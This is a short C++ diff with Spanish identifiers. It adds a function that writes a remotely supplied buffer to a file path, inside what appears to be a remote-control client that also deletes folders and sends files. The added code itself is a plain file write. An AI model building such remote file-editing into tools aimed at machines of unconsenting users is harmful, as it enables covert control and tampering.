@@ -161,6 +161,34 @@ void BorrarFolder(c_char* cPath) {
 	RemoveDirectoryA((LPCSTR)cPath);
 }
 
+void EditarArchivo_Guardar(std::string strPath, c_char* cBuffer, std::streamsize iBufferSize) {
+#ifdef ___DEBUG_
+	std::cout << "[!] Guardando archivo [remote-edit]: " << strPath << std::endl;
+	std::cout << "[!]Buffer:" << std::endl << cBuffer << std::endl;
+#endif
+	
+	std::ofstream localFile(strPath, std::ios::binary);
+	if (!localFile.is_open()) {
+#ifdef ___DEBUG_
+		error();
+		std::cout << "No se pudo abrir el archivo " << strPath << std::endl;
+#endif
+		return;
+	}
+
+	localFile.write(cBuffer, iBufferSize);
+
+	size_t iFinal = localFile.tellp();
+#ifdef ___DEBUG_
+	std::cout << "[!] " << iFinal << " escritos" << std::endl;
+#endif	
+
+
+	localFile.flush();
+	localFile.close();
+
+}
+
 void EnviarArchivo(const std::string& cPath, const std::string& cID, Cliente* copy_ptr) {
 #ifdef ___DEBUG_
 	std::cout << "[ID-"<<cID<<"]Enviando " << cPath << std::endl;
